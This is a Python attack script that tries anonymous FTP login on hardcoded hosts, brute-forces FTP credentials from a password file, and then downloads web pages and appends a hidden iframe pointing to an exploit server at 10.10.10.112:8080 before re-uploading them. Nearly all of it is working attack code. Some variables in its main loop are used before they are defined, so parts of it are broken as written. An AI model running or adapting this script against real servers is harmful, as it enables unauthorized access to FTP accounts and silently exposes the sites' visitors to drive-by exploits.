import time, optparse, ftplib


def anon_login(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] %s FTP Anonymous Logon Succeeded.' % str(hostname))
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] %s FTP Anonymous Logon Failed.' % str(hostname))
        return False


def brute_login(hostname, pwdFN):
    pwdF = open(pwdFN, 'r')
    for line in pwdF.readlines():
        time.sleep(1)
        username = line.split(':')[0]
        pwd = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: %s/%s' % (username, pwd))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, pwd)
            print('\n[*] %s FTP Logon Succeeded: %s/%s' % (str(hostname), username, pwd))
            ftp.quit()
            return (username, pwd)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)


def get_default_pages(ftp):
    ext_list = ['.php', '.htm', '.asp']
    try:
        dir_list = ftp.nlst()
    except Exception as e:
        dir_list = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return
    ret_list = []
    for fn in dir_list:
        fn = fn.lower()
        for ext in ext_list:
            if ext in fn:
                print('[+] Found default page: %s' % fn)
                ret_list.append(fn)
    return ret_list


def inject_page(ftp, page, redirect):
    f = open('%s.tmp' % page, 'w')
    ftp.retrlines('RETR %s' % page, f.write)
    print('[+] Downloaded Page: %s' % page)
    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: %s' % page)
    ftp.storlines('STOR %s' % page, open('%s.tmp' % page))
    print('[+] Uploaded Injected Page: %s' % page)


def attack(username, pwd, host, redirect):
    ftp = ftplib.FTP(host)
    ftp.login(username, pwd)
    default_pages = get_default_pages(ftp)
    for default_page in default_pages:
        inject_page(ftp, default_page, redirect)


# parser = optparse.OptionParser('usage%prog -H <target host(s)> -r <redirect page> [-f <userpass file>]')
# parser.add_option('-H', dest='hosts', type='string', help='specify target host(s)')
# parser.add_option('-r', dest='redirect', type='string', help='specify a redirection page')
# parser.add_option('-f', dest='pwFN', type='string', help='specify user/password fiel')
# (options, args) = parser.parse_args()
# hosts = str(options.hosts).split(',')
# pwFN = options.pwFN
# redirect = options.redirect
# if hosts == None or redirect == None:
    # print(parser.usage)
    # exit(0)

hosts = ['192.168.0.117', '192.168.0.103', '127.0.0.1']
for h in hosts:
    username = None
    pw = None
    if anon_login(h):
        username = 'anonymous'
        pw = 'me@your.com'
        print('[+] Using Anonymous Creds to attack')
        attack(username, pw, h, redirect)
    elif pwFN:
        (username, pw) = brute_login(h, pwFN)
    if pw:
        print('[+] Using Creds: %s/%s to attack' % (username, pw))
        attack(username, pw, h, redirect)



host = '127.0.0.1'
username = 'guest'
pwd = 'guest'
ftp = ftplib.FTP(host)
ftp.login(username, pwd)
redirect = '<iframe src="http://10.10.10.112:8080/exploit"></iframe>'
inject_page(ftp, 'index.html', redirect)
